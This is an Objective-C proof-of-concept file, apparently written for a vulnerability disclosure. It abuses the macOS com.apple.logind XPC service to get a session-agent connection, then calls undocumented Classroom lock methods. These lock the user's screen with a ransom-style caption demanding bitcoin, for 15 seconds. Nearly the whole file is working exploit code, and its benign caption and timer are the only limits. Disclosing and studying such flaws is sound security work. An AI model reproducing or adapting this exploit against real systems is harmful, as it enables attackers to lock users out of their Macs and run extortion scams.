//
//  ViewController.m
//  poc
//
//  Created by andr on 14.04.2026.
//

#import "ViewController.h"

@protocol LFLogindLookup <NSObject>
- (void)SMGetSessionAgentConnection:(void (^)(int, NSXPCListenerEndpoint *))reply;
@end

@protocol LFSessionAgent <NSObject>
- (void)SACClassroomLockSetCaption:(NSString *)caption reply:(void (^)(int))reply;
- (void)SACClassroomLockShow:(void (^)(int))reply;
- (void)SACClassroomLockHide:(void (^)(int))reply;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSXPCConnection *c = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.logind" options:0];
        c.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(LFLogindLookup)];
        [c resume];

        dispatch_semaphore_t s = dispatch_semaphore_create(0);
        __block NSXPCListenerEndpoint *ep;
        [[c remoteObjectProxy] SMGetSessionAgentConnection:^(int e, NSXPCListenerEndpoint *p) { ep = p; dispatch_semaphore_signal(s); }];
        dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));

        NSXPCConnection *lw = [[NSXPCConnection alloc] initWithListenerEndpoint:ep];
        lw.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(LFSessionAgent)];
        [lw resume];
        id<LFSessionAgent> agent = [lw remoteObjectProxy];

        dispatch_semaphore_t s1 = dispatch_semaphore_create(0);
        [agent SACClassroomLockSetCaption:@"YOUR MAC HAS BEEN LOCKED :))\n\nSend 0.0 BTC to 0x41414141DEADBEEF\n\nDon't worry, it's just for 15 seconds to show the PoC :))" reply:^(int e) { dispatch_semaphore_signal(s1); }];
        dispatch_semaphore_wait(s1, dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC));

        dispatch_semaphore_t s2 = dispatch_semaphore_create(0);
        [agent SACClassroomLockShow:^(int e) { dispatch_semaphore_signal(s2); }];
        dispatch_semaphore_wait(s2, dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC));

        [NSThread sleepForTimeInterval:15.0];

        [agent SACClassroomLockHide:^(int e) {}];
    });
}

@end
